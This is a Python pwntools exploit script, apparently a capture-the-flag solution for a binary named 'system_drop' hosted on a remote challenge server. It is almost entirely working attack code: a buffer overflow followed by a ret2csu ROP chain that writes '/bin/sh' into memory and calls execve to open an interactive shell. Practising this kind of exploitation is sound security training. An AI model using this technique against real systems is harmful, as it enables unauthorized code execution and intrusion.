#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./system_drop')
context.terminal = ["tilix","-a","session-add-right","-e"]

host = args.HOST or '138.68.141.182'
port = int(args.PORT or 32210)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *0x00000000004005B0
continue
'''.format(**locals())

# -- Exploit goes here --

def gen_ret2csu(callwhat, rdi, rsi, rdx, callnext):
    rop = flat([

        pop_all,
        0x0,
        0x1,
        callwhat,
        rdi,
        rsi,
        rdx,
        mov_rdx,
        p64(0x0)*7,
        callnext
])
    return rop

io = start()
pop_all = 0x00000000004005CA
mov_rdx = 0x00000000004005B0
bss = 0x6011c0
payload = b"A"*40
payload += gen_ret2csu(exe.got['read'], 0x0, bss, 0x1337, exe.sym.main)
io.send(payload)
print("[+] stage one sent")
pause()
lmao = p64(0x0000000040053b) + b"/bin/sh\x00"
io.send(lmao.ljust(0x3b, b'\x00'))
pause()
print("[+] stage two sent")

payload = b"A"*40
payload += gen_ret2csu(bss, 0x1, bss, 0x3b, 0x00000000004005CC)
# payload += p64(0x00000000004005CC)#pop some shit
payload += p64(bss)
payload += p64(bss + 8)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(mov_rdx)
io.send(payload)

io.interactive()